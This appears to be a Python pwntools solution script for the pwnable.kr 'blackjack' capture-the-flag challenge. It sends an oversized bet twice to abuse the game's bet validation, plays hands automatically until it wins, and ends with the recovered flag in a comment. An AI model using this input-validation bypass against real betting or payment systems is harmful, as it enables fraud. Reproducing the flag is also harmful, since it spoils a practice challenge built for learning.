from pwn import *


def bet_trick():
    sh.recvuntil("Bet: $")
    sh.sendline("999999999")
    sh.recvuntil("Bet: ")
    sh.sendline("999999999")
    sh.recvuntil(prompt["step"])
    sh.sendline("H")


def auto_blackjack():
    while True:
        txt = sh.recvregex("({0}|{1})".format(prompt["step"], prompt["again"]))
        print txt
        if re.findall(prompt["step"], txt):
            your = int(re.findall("Your Total is (\d+)", txt)[0])
            dealer = int(re.findall("The Dealer Has a Total of (\d+)", txt)[0])
            sh.sendline("S" if your > dealer else "H")
        elif re.findall(prompt["win"], txt):
            sh.sendline("Y")
            return sh.recvlines(2)[1].split(";")[1]
        else:
            sh.sendline("Y")
            sh.recvuntil(prompt["again"])
            sh.sendline("Y")
            bet_trick()


prompt = {
    "win": "You Win!",
    "lose": "You Lose",
    "over": "You Went WAY over.",
    "again": "Please Enter Y for Yes or N for No",
    "step": "Please Enter H to Hit or S to Stay."
}

# start blackjack
sh = remote("pwnable.kr", 9009)
sh.sendline("Y")
sh.sendline("1")
bet_trick()
print(auto_blackjack())

# 1HYaY_I_AM_A_MILLIONARE_LOL
